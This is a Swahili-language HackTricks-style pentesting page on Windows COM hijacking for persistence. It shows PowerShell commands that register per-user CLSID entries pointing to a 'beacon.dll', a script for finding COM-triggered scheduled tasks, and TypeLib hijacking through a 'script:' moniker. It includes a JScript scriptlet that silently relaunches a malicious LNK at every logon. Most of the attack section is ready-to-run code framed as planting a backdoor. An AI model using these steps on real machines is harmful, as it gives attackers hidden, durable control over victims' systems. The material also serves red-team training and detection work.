# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Kutafuta vipengele vya COM visivyopo

Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **mbinu za kudumu**. Kwa kutumia `procmon` ni rahisi kupata rejista za COM zinazotafutwa ambazo hazipo ambazo mshambuliaji angeweza kuunda ili kudumu. Vichujio:

- **RegOpenKey** operesheni.
- ambapo _Result_ ni **NAME NOT FOUND**.
- na _Path_ inaishia na **InprocServer32**.

Ukishamua COM isiyokuwepo unayotaka kuiga, tekeleza amri zifuatazo. _Kuwa mwangalifu ikiwa utaamua kuiga COM inayopakiwa kila sekunde chache kwani inaweza kuwa ya ziada._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Vipengele vya COM vya Task Scheduler vinavyoweza kuporwa

Windows Tasks hutumia Custom Triggers kuwaita COM objects, na kwa sababu zinaendeshwa kupitia Task Scheduler, ni rahisi kutabiri lini zitaamshwa.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ukikagua matokeo unaweza kuchagua ile ambayo itaendeshwa **kila wakati mtumiaji anapoingia** kwa mfano.

Sasa ukiyatafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na katika HKLM na HKCU, kawaida utagundua kuwa thamani hiyo haipo katika HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Kisha, unaweza kuunda tu entry ya HKCU na kila mara mtumiaji atakapojisajili, backdoor yako itatekelezwa.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) hueleza interfaces za COM na zinapakiwa kupitia `LoadTypeLib()`. Wakati COM server inapojengwa, OS pia inaweza kupakia TypeLib inayohusiana kwa kuangalia vigezo vya rejista chini ya `HKCR\TypeLib\{LIBID}`. Ikiwa njia ya TypeLib itabadilishwa kuwa **moniker**, mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet wakati TypeLib itakapotatuliwa — ikitoa uendelevu wa kimfichoni unaochochewa wakati vipengele vya kawaida vinapoguswa.

Hii imeonekana dhidi ya Microsoft Web Browser control (kinachopakiwa mara kwa mara na Internet Explorer, programu zinazojumuisha WebBrowser, na hata `explorer.exe`).

### Hatua (PowerShell)

1) Tambua TypeLib (LIBID) inayotumika na CLSID inayotumika mara kwa mara. Mfano wa CLSID unaotumiwa mara nyingi na malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Elekeza per-user TypeLib path kwa scriptlet ya ndani kwa kutumia moniker ya `script:` (haitaji ruhusa za admin):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Weka JScript `.sct` ndogo inayoiendesha tena payload yako kuu (kwa mfano `.lnk` inayotumika katika mnyororo wa awali):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Kusababisha – kufungua IE, au programu inayojumuisha WebBrowser control, au hata shughuli za kawaida za Explorer zitaleta TypeLib na kutekeleza scriptlet, kuwasha tena mnyororo wako wakati wa logon/reboot.

Usafishaji
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Vidokezo
- Unaweza kutumia mantiki sawa kwenye komponenti nyingine za COM zinazotumika sana; daima pata `LIBID` halisi kutoka `HKCR\CLSID\{CLSID}\TypeLib` kwanza.
- Kwenye mifumo ya 64-bit unaweza pia kujaza subkey ya `win64` kwa watumiaji wa 64-bit.

## Marejeo

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
